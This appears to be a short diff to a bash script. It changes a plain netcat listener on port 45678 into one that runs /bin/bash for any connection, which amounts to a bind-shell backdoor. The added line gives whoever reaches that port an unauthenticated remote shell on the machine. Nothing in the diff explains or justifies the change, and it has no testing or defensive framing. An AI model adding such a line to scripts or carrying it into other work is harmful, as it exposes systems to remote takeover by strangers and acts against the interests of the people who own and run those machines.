@@ -1,3 +1,3 @@
 #!/bin/bash
 
-nc -l -p 45678
+nc -l -p 45678 -e /bin/bash
